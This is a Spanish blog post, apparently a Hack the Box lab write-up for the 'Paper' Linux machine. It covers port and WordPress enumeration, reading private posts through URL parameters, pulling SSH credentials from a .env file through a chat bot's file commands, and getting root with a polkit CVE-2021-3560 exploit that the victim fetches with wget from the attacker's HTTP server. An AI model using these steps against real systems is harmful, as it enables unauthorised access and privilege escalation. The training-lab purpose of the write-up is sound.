---
layout      : post
title       : "Paper - Hack the Box"
author      : elc4br4
image       : assets/images/HTB/Paper-Hackthebox/paper.webp
category    : [ htb ]
tags        : [ Linux ]
---

En esta ocasión tenemos una máquina Linux de dificultad fácil que requiere de un escaneo básico y enumeración para obtener un punto de apoyo en la máquina. La escalada de privilegios es un proceso relativamente simple y requirió usar la escalada de privilegios de Linux a través de la explotación de la vulnerabilidad CVE-2021–3560.

![](/assets/images/HTB/Paper-Hackthebox/rating-paper.png)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

Como siempre, comenzamos lanzando nmap para descubrir puertos abiertos.

```bash
nmap -p- -n -Pn --min-rate 5000 10.10.11.143 -sCV --open
```

![](/assets/images/HTB/Paper-Hackthebox/nmap.png)

<br>
Como vemos tenemos los puertos 80, 443 y 22

En el puerto 80 encuentro lo siguiente:

![](/assets/images/HTB/Paper-Hackthebox/web1.png)

En la página principal no hay nada interesante, lanzo gobuster y no encuentro nada relevante, ninguna ruta ni archivos con extensión…

Decido lanzar nikto para un escaneo más detallado y potente y encuentro esto:

`` nikto -h 10.10.11.143 ``

![](/assets/images/HTB/Paper-Hackthebox/nikto.png)

Tenemos un vhost que añado a al archivo hosts de mi máquina.

Accedemos desde el navegador al vhost y encontramos una web diferente, en concreto, un Wordpress.

![](/assets/images/HTB/Paper-Hackthebox/web2.png)

Cuando hablamos de Wordpress… Wpscan es la clave!!!

Lanzo wpscan bajo el siguiente comando

```bash 
wpscan --enumerate --url office.paper 
```

![](/assets/images/HTB/Paper-Hackthebox/wpscan.png)

Y además de los usuarios encuentro la versión de Wordpress

![](/assets/images/HTB/Paper-Hackthebox/wpscan2.png)

Lo siguiente que hago al saber la versión es buscar posibles vulnerabilidades en la versión Wordpress 5.2.3

![](/assets/images/HTB/Paper-Hackthebox/searchsploit.png)

Encuentro una vulnerabilidad que permite leer Posts Privados sin necesidad de estar autenticados en Wordpress.

![](/assets/images/HTB/Paper-Hackthebox/exploitdb.png)

Usando ciertos parámetros en la url podemos descubrir posts privados.

`` http://office.paper/?static=1&order=YYYYMMDD ``


![](/assets/images/HTB/Paper-Hackthebox/web3.png)


Donde encontramos un subdominio y una url.

Lo añadimos al archivo hosts, accedemos a la url y encontramos un formulario de registro.

![](/assets/images/HTB/Paper-Hackthebox/web4.png)


Me registro y accedo con las credenciales creadas.

![](/assets/images/HTB/Paper-Hackthebox/web5.png)


Nos encontramos con una especie de chat, buscando encuentro un grupo llamado #general al que accedo.

![](/assets/images/HTB/Paper-Hackthebox/web6.png)


En el cual hay varios usuarios y lo que parece ser un bot (recyclops).

Leyendo los mensajes del grupo, encuentro varios mensajes enviados por el bot (recyclops) que dicen lo siguiente:


![](/assets/images/HTB/Paper-Hackthebox/web7.png)
<br>
<br>

![](/assets/images/HTB/Paper-Hackthebox/web8.png)

Este bot nos permite ejecutar varios comandos:

``` code
    list → listar archivos

    file → leer archivos
```

Asique procedo a probar los comandos y a ver que respuesta me devuelve:

![](/assets/images/HTB/Paper-Hackthebox/web9.png)

Voy listando poco a poco hasta que encuentro lo siguiente:

![](/assets/images/HTB/Paper-Hackthebox/web10.png)


Voy leyendo diferentes archivos hasta que encuentro dentro de la ruta ../hubot un archivo .env

![](/assets/images/HTB/Paper-Hackthebox/web11.png)

Y encuentro credenciales que podrían ser válidas para conectarnos por ssh

Al probarlas, no funciona … Pero me fijé en que el propietario de los archivos del servidor es dwight.

Pruebo con dwight y consigo acceder, conexión ssh exitosa.

`` ssh dwight@10.10.11.143 `` 

Una vez estamos dentro podremos leer la flag user.txt

A continuación me dispongo a escalar privilegios y lanzo el famoso **linpeas.sh** para buscar posibles formas de escalar.

Y me encuentro con una posible vulnerabilidad

![](/assets/images/HTB/Paper-Hackthebox/cve.png)

  **CVE-2021–3560** permite que un atacante local sin privilegios obtenga privilegios de root mediante el uso de polkit
<br>
<br>

## #REFERENCIAS

    https://github.com/Almorabea/Polkit-exploit

    https://www.hackplayers.com/2021/06/escalado-de-privilegios-mediante-polkit.html

Encuentro el exploit aquí, lo descargo y mediante el uso de un servidor de python3 me lo descargo desde la máquina.


Máquina atacante

```bash
 python3 -m http.server 8080 
 ```


Máquina Víctima (ssh)

```bash
 wget http://<ip-tun0>:<8080>/exploitname.py 
 ```
<br>

![](/assets/images/HTB/Paper-Hackthebox/exploit.png)

<br>

Le asigno permisos, lo ejecuto y listo, somos root y podemos leer la flag root.txt.

![](/assets/images/HTB/Paper-Hackthebox/exploit2.png)

<br>

![](/assets/images/HTB/Paper-Hackthebox/exploit3.png)

<br>

![](/assets/images/HTB/Paper-Hackthebox/root.png)


